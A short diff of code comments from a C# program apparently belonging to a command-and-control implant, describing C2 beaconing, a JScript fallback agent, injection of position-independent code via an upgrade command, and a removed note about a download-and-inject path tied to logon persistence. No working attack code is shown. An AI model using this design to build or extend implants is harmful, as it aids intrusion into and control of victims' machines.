@@ -18,10 +18,9 @@ namespace CSharpAgent
     //               loop, so exactly one agent beacons the shared MachineGuid session from here
     //               on. Run returns only on a fatal transport failure, unwinding back into the
     //               JScript agent underneath (which then resumes beaconing as the fallback).
-    //   A_URL set → legacy one-shot injector: download the PIC bytes and inject them (the
-    //               Persistence Manager's on-logon flow depends on this path — it sets A_URL
-    //               and deserializes the same assembly).
-    //   neither   → return. Standalone builds carry nothing baked (see C2Payload).
+    //   neither   → return (nothing to beacon). The injected-PIC upgrade (0x0C UpgradeNative)
+    //               carries the bytes IN the command — there is no runtime download and no
+    //               A_URL anywhere in this agent.
     [ComVisible(true)]
     public class Program
     {
